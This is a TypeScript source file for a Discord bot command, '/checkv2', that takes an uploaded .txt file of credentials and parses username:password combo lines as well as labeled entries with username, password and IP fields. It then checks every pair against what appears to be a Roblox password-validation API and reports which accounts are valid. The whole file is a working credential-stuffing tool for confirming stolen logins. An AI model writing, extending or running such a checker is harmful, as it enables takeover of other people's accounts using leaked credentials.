import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  MessageFlags,
  EmbedBuilder,
} from 'discord.js';
import axios from 'axios';
import { validatePassword } from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

type Credential = { username: string; password: string };

function parseCredentials(content: string): Credential[] {
  const lines = content.split('\n').map(l => l.trim()).filter(Boolean);
  const result: Credential[] = [];
  let current: Partial<Credential> = {};

  for (const line of lines) {
    // Check for simple colon-separated format: username:password[:ip]
    if (line.includes(':') && !line.includes(' ')) {
      const parts = line.split(':');
      if (parts.length >= 2) {
        result.push({ username: parts[0].trim(), password: parts[1].trim() });
      }
      continue;
    }

    // Check for labeled format: "username: value" or "password: value" or "ip address: value"
    const lower = line.toLowerCase();
    let key: string | null = null;
    let value: string | null = null;

    if (lower.startsWith('username:')) {
      key = 'username';
      value = line.slice('username:'.length).trim();
    } else if (lower.startsWith('password:')) {
      key = 'password';
      value = line.slice('password:'.length).trim();
    } else if (lower.startsWith('ip address:') || lower.startsWith('ip:')) {
      key = 'ip';
      value = line.slice(line.indexOf(':') + 1).trim();
    }

    if (key && value) {
      if (key === 'username') {
        // If we already have a partial credential (with password), push it first
        if (current.username && current.password) {
          result.push(current as Credential);
          current = {};
        }
        current.username = value;
      } else if (key === 'password') {
        current.password = value;
      } else if (key === 'ip') {
        // ignore IP
      }
    }
  }

  // Push the last credential if complete
  if (current.username && current.password) {
    result.push(current as Credential);
  }

  return result;
}

const data = new SlashCommandBuilder()
  .setName('checkv2')
  .setDescription('Mass check username:password credentials from a .txt file')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing credentials (supports username:password or labeled format)')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      const embed = buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed in checkv2');
      const embed = buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file. Please try again.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const credentials = parseCredentials(fileContent);
    if (credentials.length === 0) {
      const embed = buildErrorEmbed('✧ **No Credentials Found**\n────\n⭑ No valid username:password pairs found in the file.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed(`Scanning ${credentials.length} credential(s)...`);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    const total = credentials.length;

    for (const cred of credentials) {
      const result = await validatePassword(cred.username, cred.password);
      if (!result.valid) continue;

      validCount++;
      const embed = buildBaseEmbed(
        '𖣐 Valid Credential',
        `✧ **Username:** ${cred.username}\n` +
        `⭑ **Password:** ${'*'.repeat(cred.password.length)}\n` +
        `⭑ **Status:** ✅ Valid`
      );
      await interaction.followUp({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }

    const summaryEmbed = buildSuccessEmbed(
      validCount === 0
        ? `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** 0\n⭑ All are invalid.`
        : `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** ${validCount}`
    );
    await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
  } catch (err: any) {
    logger.error({ err }, 'CheckV2 command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

export const checkv2Command: Command = { data, execute };